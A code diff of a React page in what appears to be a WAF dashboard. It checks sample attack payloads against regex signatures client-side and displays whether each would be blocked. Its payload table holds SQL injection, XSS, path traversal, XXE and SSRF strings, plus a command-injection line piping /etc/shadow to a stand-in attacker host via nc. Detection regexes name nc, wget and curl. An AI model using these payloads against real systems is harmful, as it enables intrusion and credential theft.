@@ -1,27 +1,28 @@
+// PATH: client/src/app/(dashboard)/simulate/page.tsx
 'use client'
 import { useState } from 'react'
 import type { SimAttackType, SimResult } from '@/types'
 
 const SIM_RULES: Record<SimAttackType, { name: string; conf: number; patterns: RegExp[] }> = {
-    sqli: { name: 'SQL Injection (OWASP A03)', conf: 97, patterns: [/'|--|;|union|select|drop|insert|delete|exec|xp_/i] },
-    xss: { name: 'Cross-Site Scripting (A03)', conf: 93, patterns: [/<script|onerror|onload|javascript:|<img|alert\(/i] },
-    path: { name: 'Path Traversal (A05)', conf: 91, patterns: [/\.\.[/\\]|etc\/passwd|win\.ini|boot\.ini/i] },
+    sqli: { name: 'SQL Injection (OWASP A03)', conf: 97, patterns: [/'|--|;|union|select|drop|insert|delete|exec/i] },
+    xss: { name: 'Cross-Site Scripting (A03)', conf: 93, patterns: [/<script|onerror|onload|javascript:|alert\(/i] },
+    path: { name: 'Path Traversal (A05)', conf: 91, patterns: [/\.\.[/\\]|etc\/passwd|win\.ini/i] },
     cmd: { name: 'Command Injection (A03)', conf: 96, patterns: [/;|\|&|`|\$\(|nc |wget |curl /i] },
     csrf: { name: 'CSRF Attack (A01)', conf: 78, patterns: [/csrf|xsrf|forged/i] },
     xxe: { name: 'XXE Injection (A05)', conf: 90, patterns: [/<!entity|system\s*"|doctype/i] },
     ssrf: { name: 'SSRF (A10)', conf: 94, patterns: [/169\.254\.|10\.|192\.168\.|localhost|metadata/i] },
-    brute: { name: 'Brute Force (A07)', conf: 88, patterns: [/admin|root|password|123|qwerty|letmein/i] },
+    brute: { name: 'Brute Force (A07)', conf: 88, patterns: [/admin|root|password|123|qwerty/i] },
 }
 
 const PAYLOADS: Record<SimAttackType, string> = {
-    sqli: "' OR '1'='1'; DROP TABLE users;--",
-    xss: "<script>alert(document.cookie)</script>",
-    path: "../../etc/passwd",
-    cmd: "; cat /etc/shadow | nc attacker.com 4444",
+    sqli: "'; DROP TABLE users; --",
+    xss: '<script>alert(document.cookie)</script>',
+    path: '../../etc/passwd',
+    cmd: '; cat /etc/shadow | nc attacker.com 4444',
     csrf: "<form action='/transfer' method='POST'>...",
     xxe: '<?xml version="1.0"?><!DOCTYPE x [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>',
-    ssrf: "http://169.254.169.254/latest/meta-data/",
-    brute: "admin / password123",
+    ssrf: 'http://169.254.169.254/latest/meta-data/',
+    brute: 'admin / password123',
 }
 
 const LABELS: Record<SimAttackType, string> = {
@@ -35,10 +36,24 @@ const LABELS: Record<SimAttackType, string> = {
     brute: 'Brute Force (A07)',
 }
 
+const panel: React.CSSProperties = { background: 'var(--bg2)', border: '1px solid var(--border)', borderRadius: 10, overflow: 'hidden' }
+const panelHeader: React.CSSProperties = { padding: '13px 16px', borderBottom: '1px solid var(--border)' }
+const panelTitle: React.CSSProperties = { fontSize: 12.5, fontWeight: 600, color: '#cbd5e1' }
+const label: React.CSSProperties = { fontSize: 10, color: 'var(--text3)', textTransform: 'uppercase' as const, letterSpacing: '.7px', fontWeight: 500, marginBottom: 6, display: 'block' }
+const formGroup: React.CSSProperties = { marginBottom: 14 }
+
+function DetailRow({ k, v, vStyle }: { k: string; v: string; vStyle?: React.CSSProperties }) {
+    return (
+        <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'flex-start', gap: 12, padding: '6px 0', borderBottom: '1px solid rgba(30,42,56,.6)' }}>
+            <span style={{ fontSize: 11.5, color: 'var(--text3)', flexShrink: 0 }}>{k}</span>
+            <span style={{ fontSize: 11.5, color: 'var(--text2)', textAlign: 'right', ...vStyle }}>{v}</span>
+        </div>
+    )
+}
+
 export default function SimulatePage() {
     const [type, setType] = useState<SimAttackType>('sqli')
     const [endpoint, setEndpoint] = useState('/api/login')
-    const [method, setMethod] = useState('POST')
     const [payload, setPayload] = useState(PAYLOADS['sqli'])
     const [result, setResult] = useState<SimResult | null>(null)
     const [loading, setLoading] = useState(false)
@@ -56,14 +71,15 @@ export default function SimulatePage() {
             setResult({
                 detected,
                 attackType: LABELS[type],
-                endpoint: `${method} ${endpoint}`,
-                method, payload,
+                endpoint: `POST ${endpoint}`,
+                method: 'POST',
+                payload,
                 riskScore: risk,
                 confidence: conf,
                 rulesTriggered: [
                     { name: sig.name, match: detected },
                     { name: 'Signature DB v4.1', match: detected },
-                    { name: 'Anomaly Score >80', match: detected && conf > 80 },
+                    { name: 'Anomaly Score Threshold (80)', match: detected && conf > 80 },
                 ],
             })
             setLoading(false)
@@ -71,161 +87,163 @@ export default function SimulatePage() {
     }
 
     return (
-        <div className="animate-fadein">
-            <div className="grid grid-cols-1 lg:grid-cols-2 gap-4">
+        <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: 14, alignItems: 'start' }}
+            className="sim-grid">
+            <style>{`@media(max-width:768px){.sim-grid{grid-template-columns:1fr!important}}`}</style>
 
-                {/* ── Left: Config ─── */}
-                <div className="space-y-4">
-                    <div className="bg-bg2 border border-border1 rounded-xl overflow-hidden">
-                        <div className="px-4 py-3 border-b border-border1">
-                            <span className="text-[12.5px] font-semibold text-slate-300">Attack Configuration</span>
-                        </div>
-                        <div className="p-4 space-y-4">
-                            <div>
-                                <label className="block text-xs text-text2 mb-1.5 uppercase tracking-wider">Attack Type (OWASP)</label>
-                                <select className="inp w-full" value={type} onChange={e => loadPayload(e.target.value as SimAttackType)}>
-                                    {(Object.keys(LABELS) as SimAttackType[]).map(k => (
-                                        <option key={k} value={k}>{LABELS[k]}</option>
-                                    ))}
-                                </select>
-                            </div>
-                            <div>
-                                <label className="block text-xs text-text2 mb-1.5 uppercase tracking-wider">Target Endpoint</label>
-                                <input className="inp w-full" value={endpoint} onChange={e => setEndpoint(e.target.value)} />
-                            </div>
-                            <div>
-                                <label className="block text-xs text-text2 mb-1.5 uppercase tracking-wider">HTTP Method</label>
-                                <select className="inp w-full" value={method} onChange={e => setMethod(e.target.value)}>
-                                    {['POST', 'GET', 'PUT', 'DELETE', 'PATCH'].map(m => <option key={m}>{m}</option>)}
-                                </select>
-                            </div>
-                            <div>
-                                <label className="block text-xs text-text2 mb-1.5 uppercase tracking-wider">Payload</label>
-                                <textarea
-                                    rows={4}
-                                    className="w-full bg-bg3 border border-border1 rounded-lg p-3 text-[12px] font-mono text-red-300 resize-y outline-none focus:border-blue transition-colors"
-                                    value={payload}
-                                    onChange={e => setPayload(e.target.value)}
-                                />
-                            </div>
-                            <button
-                                onClick={simulate}
-                                disabled={loading}
-                                className="w-full py-2.5 bg-blue hover:bg-blue/90 text-white font-semibold rounded-lg transition-colors disabled:opacity-60 text-sm"
-                            >
-                                {loading ? 'Analyzing…' : '⚡ Run Attack Simulation'}
-                            </button>
-                        </div>
-                    </div>
+            {/* ── Left: Config ── */}
+            <div style={{ display: 'flex', flexDirection: 'column', gap: 14 }}>
 
-                    {/* Quick payloads */}
-                    <div className="bg-bg2 border border-border1 rounded-xl overflow-hidden">
-                        <div className="px-4 py-3 border-b border-border1">
-                            <span className="text-[12.5px] font-semibold text-slate-300">Quick Payloads</span>
+                <div style={panel}>
+                    <div style={panelHeader}><span style={panelTitle}>Attack Configuration</span></div>
+                    <div style={{ padding: 16 }}>
+
+                        <div style={formGroup}>
+                            <span style={label}>Attack Type (OWASP)</span>
+                            <select className="inp" style={{ width: '100%' }} value={type} onChange={e => loadPayload(e.target.value as SimAttackType)}>
+                                {(Object.keys(LABELS) as SimAttackType[]).map(k => <option key={k} value={k}>{LABELS[k]}</option>)}
+                            </select>
                         </div>
-                        <div className="p-3 space-y-1">
-                            {(Object.keys(LABELS) as SimAttackType[]).map(k => (
-                                <button
-                                    key={k}
-                                    onClick={() => loadPayload(k)}
-                                    className={`w-full text-left px-3 py-2 rounded-lg text-[12px] transition-colors ${type === k ? 'bg-blue-dim text-blue' : 'text-text3 hover:bg-white/[.03] hover:text-text2'}`}
-                                >
-                                    {LABELS[k]}
-                                </button>
-                            ))}
+
+                        <div style={formGroup}>
+                            <span style={label}>Target Endpoint</span>
+                            <input className="inp" style={{ width: '100%' }} value={endpoint} onChange={e => setEndpoint(e.target.value)} />
                         </div>
+
+                        <div style={formGroup}>
+                            <span style={label}>Payload</span>
+                            <textarea
+                                rows={5}
+                                style={{
+                                    width: '100%', background: 'var(--bg3)', border: '1px solid var(--border)',
+                                    borderRadius: 7, padding: '9px 12px', fontSize: 12,
+                                    fontFamily: 'JetBrains Mono, monospace', color: '#fca5a5',
+                                    resize: 'vertical', outline: 'none', transition: 'border-color .15s', boxSizing: 'border-box',
+                                }}
+                                value={payload}
+                                onChange={e => setPayload(e.target.value)}
+                                onFocus={e => (e.target.style.borderColor = 'var(--blue)')}
+                                onBlur={e => (e.target.style.borderColor = 'var(--border)')}
+                            />
+                        </div>
+
+                        <button
+                            className="btn btn-primary"
+                            style={{ width: '100%', justifyContent: 'center', padding: '10px 0', fontSize: 13, fontWeight: 600 }}
+                            onClick={simulate}
+                            disabled={loading}
+                        >
+                            {loading ? 'Analyzing…' : '⚡ Run Simulation'}
+                        </button>
                     </div>
                 </div>
 
-                {/* ── Right: Result ─── */}
-                <div>
-                    <div className="bg-bg2 border border-border1 rounded-xl overflow-hidden h-full">
-                        <div className="px-4 py-3 border-b border-border1">
-                            <span className="text-[12.5px] font-semibold text-slate-300">Simulation Result</span>
-                        </div>
-                        <div className="p-4">
-                            {!result && !loading && (
-                                <div className="flex flex-col items-center justify-center py-16 text-text3 text-sm gap-2">
-                                    <span className="text-3xl opacity-30">⚡</span>
-                                    Configure and run a simulation to see results
-                                </div>
-                            )}
-
-                            {loading && (
-                                <div className="flex items-center justify-center py-16 text-text3 text-sm gap-2">
-                                    <div className="w-4 h-4 border-2 border-border2 border-t-blue rounded-full animate-spin" />
-                                    Analyzing payload…
-                                </div>
-                            )}
-
-                            {result && (
-                                <div className="space-y-4 animate-fadein">
-                                    {/* Verdict */}
-                                    <div className={`rounded-xl p-4 border ${result.detected ? 'bg-red-950/40 border-red-900/30' : 'bg-green-950/40 border-green-900/30'}`}>
-                                        <div className="flex items-center gap-3 mb-3">
-                                            <span className="text-2xl">{result.detected ? '⛔' : '✅'}</span>
-                                            <span className={`text-sm font-semibold ${result.detected ? 'text-red-300' : 'text-green-400'}`}>
-                                                {result.detected ? 'ATTACK BLOCKED — HTTP 403 Forbidden' : 'REQUEST ALLOWED — HTTP 200 OK'}
-                                            </span>
-                                        </div>
-                                        <div className="space-y-2 text-[12px]">
-                                            {[
-                                                ['Attack Type', result.attackType],
-                                                ['Endpoint', result.endpoint],
-                                            ].map(([k, v]) => (
-                                                <div key={k} className="flex justify-between">
-                                                    <span className="text-text3">{k}</span>
-                                                    <span className="text-text2">{v}</span>
-                                                </div>
-                                            ))}
-                                            <div className="flex justify-between">
-                                                <span className="text-text3">Risk Score</span>
-                                                <span className={`font-semibold ${result.riskScore > 80 ? 'text-red-400' : result.riskScore > 50 ? 'text-amber-400' : 'text-green-400'}`}>
-                                                    {result.riskScore}/100
-                                                </span>
-                                            </div>
-                                            <div className="flex items-center justify-between gap-3">
-                                                <span className="text-text3 flex-shrink-0">Confidence</span>
-                                                <div className="flex items-center gap-2 flex-1 justify-end">
-                                                    <div className="w-24 h-1.5 bg-border1 rounded-full overflow-hidden">
-                                                        <div
-                                                            className={`h-full rounded-full ${result.detected ? 'bg-red-500' : 'bg-green-500'}`}
-                                                            style={{ width: `${result.confidence}%` }}
-                                                        />
-                                                    </div>
-                                                    <span className={result.detected ? 'text-red-400' : 'text-green-400'}>{result.confidence}%</span>
-                                                </div>
-                                            </div>
-                                        </div>
-                                    </div>
-
-                                    {/* Rules triggered */}
-                                    <div>
-                                        <div className="text-[10.5px] text-text3 uppercase tracking-[.7px] font-medium mb-2">Rules Evaluated</div>
-                                        <div className="bg-bg3 rounded-xl overflow-hidden divide-y divide-border1/50">
-                                            {result.rulesTriggered.map(r => (
-                                                <div key={r.name} className="flex items-center gap-3 px-4 py-2.5 text-[12px]">
-                                                    <span className={r.match ? 'text-red-400' : 'text-green-400'}>{r.match ? '✕' : '✓'}</span>
-                                                    <span className="text-text2">{r.name}</span>
-                                                    <span className={`ml-auto text-[10px] ${r.match ? 'text-red-400' : 'text-green-400'}`}>
-                                                        {r.match ? 'TRIGGERED' : 'PASSED'}
-                                                    </span>
-                                                </div>
-                                            ))}
-                                        </div>
-                                    </div>
-
-                                    {result.detected && (
-                                        <div className="text-[11px] text-text3 text-center bg-bg3 rounded-lg py-3">
-                                            Request logged · IP flagged · Zero traffic passed to origin
-                                        </div>
-                                    )}
-                                </div>
-                            )}
-                        </div>
+                {/* Quick payloads */}
+                <div style={panel}>
+                    <div style={panelHeader}><span style={panelTitle}>Quick Payloads</span></div>
+                    <div style={{ padding: '8px 0' }}>
+                        {(Object.keys(LABELS) as SimAttackType[]).map(k => (
+                            <button
+                                key={k}
+                                onClick={() => loadPayload(k)}
+                                style={{
+                                    display: 'block', width: '100%', textAlign: 'left',
+                                    padding: '8px 16px', border: 'none', cursor: 'pointer',
+                                    fontSize: 12.5, fontFamily: 'inherit', transition: 'all .12s',
+                                    background: type === k ? 'var(--blue-dim)' : 'transparent',
+                                    color: type === k ? '#60a5fa' : 'var(--text3)',
+                                }}
+                                onMouseEnter={e => { if (type !== k) { (e.currentTarget.style.background = 'rgba(255,255,255,.03)'); (e.currentTarget.style.color = 'var(--text2)') } }}
+                                onMouseLeave={e => { if (type !== k) { (e.currentTarget.style.background = 'transparent'); (e.currentTarget.style.color = 'var(--text3)') } }}
+                            >
+                                {LABELS[k]}
+                            </button>
+                        ))}
                     </div>
                 </div>
             </div>
+
+            {/* ── Right: Result ── */}
+            <div style={panel}>
+                <div style={panelHeader}><span style={panelTitle}>WAF Analysis Result</span></div>
+                <div style={{ padding: 16, minHeight: 300 }}>
+
+                    {!result && !loading && (
+                        <div style={{ display: 'flex', flexDirection: 'column', alignItems: 'center', justifyContent: 'center', padding: '60px 0', gap: 12, color: 'var(--text3)' }}>
+                            <span style={{ fontSize: 32, opacity: .2 }}>⚡</span>
+                            <span style={{ fontSize: 12.5 }}>Configure and run a simulation to see results</span>
+                        </div>
+                    )}
+
+                    {loading && (
+                        <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'center', padding: '60px 0', gap: 10, color: 'var(--text3)', fontSize: 12.5 }}>
+                            <div style={{ width: 16, height: 16, border: '2px solid var(--border2)', borderTopColor: 'var(--blue)', borderRadius: '50%', animation: 'spin .7s linear infinite' }} />
+                            Analyzing payload…
+                            <style>{`@keyframes spin{to{transform:rotate(360deg)}}`}</style>
+                        </div>
+                    )}
+
+                    {result && (
+                        <div style={{ display: 'flex', flexDirection: 'column', gap: 16, animation: 'fadein .18s ease' }}>
+
+                            {/* Verdict banner */}
+                            <div style={{
+                                padding: '14px 16px', borderRadius: 8,
+                                background: result.detected ? 'rgba(239,68,68,.08)' : 'rgba(34,197,94,.08)',
+                                border: `1px solid ${result.detected ? 'rgba(239,68,68,.2)' : 'rgba(34,197,94,.2)'}`,
+                            }}>
+                                <div style={{ display: 'flex', alignItems: 'center', gap: 8, marginBottom: 10 }}>
+                                    <span style={{ fontSize: 8, width: 8, height: 8, borderRadius: '50%', background: result.detected ? 'var(--red)' : 'var(--green)', display: 'inline-block', flexShrink: 0 }} />
+                                    <span style={{ fontSize: 13, fontWeight: 700, letterSpacing: '.5px', color: result.detected ? '#fca5a5' : '#4ade80', textTransform: 'uppercase' as const }}>
+                                        {result.detected ? 'Attack Blocked' : 'Request Allowed'}
+                                    </span>
+                                </div>
+                                <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: '6px 24px', marginBottom: 12 }}>
+                                    <div>
+                                        <div style={{ fontSize: 9.5, color: 'var(--text3)', textTransform: 'uppercase' as const, letterSpacing: '.7px', fontWeight: 500 }}>Attack Type</div>
+                                        <div style={{ fontSize: 12.5, color: 'var(--text)', fontWeight: 500, marginTop: 2 }}>{result.attackType}</div>
+                                    </div>
+                                    <div>
+                                        <div style={{ fontSize: 9.5, color: 'var(--text3)', textTransform: 'uppercase' as const, letterSpacing: '.7px', fontWeight: 500 }}>Target</div>
+                                        <div style={{ fontSize: 12.5, color: '#60a5fa', fontWeight: 500, marginTop: 2 }}>{endpoint}</div>
+                                    </div>
+                                </div>
+                                <div>
+                                    <div style={{ fontSize: 9.5, color: 'var(--text3)', textTransform: 'uppercase' as const, letterSpacing: '.7px', fontWeight: 500, marginBottom: 6 }}>Confidence</div>
+                                    <div style={{ height: 4, background: 'var(--border)', borderRadius: 2, overflow: 'hidden', marginBottom: 5 }}>
+                                        <div style={{ height: '100%', width: `${result.confidence}%`, background: result.detected ? 'var(--red)' : 'var(--green)', borderRadius: 2, transition: 'width .5s' }} />
+                                    </div>
+                                    <span style={{ fontSize: 11.5, color: result.detected ? '#fca5a5' : '#4ade80', fontWeight: 500 }}>
+                                        {result.confidence}% — {result.detected ? 'High Confidence' : 'Low Risk'}
+                                    </span>
+                                </div>
+                            </div>
+
+                            {/* Rules triggered */}
+                            <div>
+                                <div style={{ fontSize: 9.5, color: 'var(--text3)', textTransform: 'uppercase', letterSpacing: '.7px', fontWeight: 500, marginBottom: 10 }}>
+                                    Rules Triggered ({result.rulesTriggered.filter(r => r.match).length})
+                                </div>
+                                <div style={{ display: 'flex', flexDirection: 'column', gap: 4 }}>
+                                    {result.rulesTriggered.map(r => (
+                                        <div key={r.name} style={{ display: 'flex', alignItems: 'center', gap: 10, padding: '7px 0', borderBottom: '1px solid rgba(30,42,56,.6)', fontSize: 12.5 }}>
+                                            <span style={{ color: r.match ? 'var(--red)' : 'var(--green)', fontSize: 13, flexShrink: 0, fontWeight: 600 }}>{r.match ? '✕' : '✓'}</span>
+                                            <span style={{ color: 'var(--text2)', flex: 1 }}>{r.name}</span>
+                                        </div>
+                                    ))}
+                                </div>
+                            </div>
+
+                            {result.detected && (
+                                <div style={{ fontSize: 11, color: 'var(--text4)', textAlign: 'center', padding: '12px 16px', background: 'var(--bg3)', borderRadius: 7 }}>
+                                    Request logged · IP flagged · Zero traffic passed to origin
+                                </div>
+                            )}
+                        </div>
+                    )}
+                </div>
+            </div>
+
         </div>
     )
 }
